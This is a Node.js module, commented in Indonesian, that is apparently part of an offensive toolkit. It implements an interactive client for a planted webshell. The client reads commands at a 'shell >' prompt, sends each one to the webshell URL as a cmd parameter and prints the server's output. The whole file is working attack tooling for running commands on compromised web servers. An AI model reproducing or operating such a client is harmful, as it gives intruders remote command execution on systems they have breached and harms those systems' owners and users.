const inquirer = require('inquirer');
const chalk = require('chalk');
const { httpRequest } = require('../core/engine');

async function startShellManager(shellUrl) {
    console.log(chalk.cyan(`\n[*] Menghubungkan ke Webshell: ${shellUrl}`));
    console.log(chalk.gray(`[*] Ketik 'exit' atau 'quit' untuk keluar dari mode interaktif.\n`));

    let isRunning = true;

    while (isRunning) {
        // Prompt interaktif (seperti terminal)
        const { cmd } = await inquirer.prompt([
            {
                type: 'input',
                name: 'cmd',
                message: chalk.green('shell >'),
            }
        ]);

        if (!cmd || cmd.trim() === '') continue;

        if (cmd.trim().toLowerCase() === 'exit' || cmd.trim().toLowerCase() === 'quit') {
            console.log(chalk.yellow('\n[*] Keluar dari Shell Manager.'));
            isRunning = false;
            break;
        }

        // Kirim perintah ke URL Webshell
        // Contoh: http://target.com/shell.php?cmd=ls -la
        const targetUrl = `${shellUrl}?cmd=${encodeURIComponent(cmd)}`;
        
        try {
            const res = await httpRequest(targetUrl);
            
            // Jika server merespons
            if (res.status === 200 || res.status === 500) {
                // Bersihkan output dari tag HTML jika perlu, lalu print
                console.log(chalk.white(res.data.trim()));
            } else {
                console.log(chalk.red(`[X] HTTP Error: ${res.status}`));
            }
        } catch (error) {
            console.log(chalk.red(`[X] Gagal mengirim perintah: ${error.message}`));
        }
    }
}

module.exports = { startShellManager };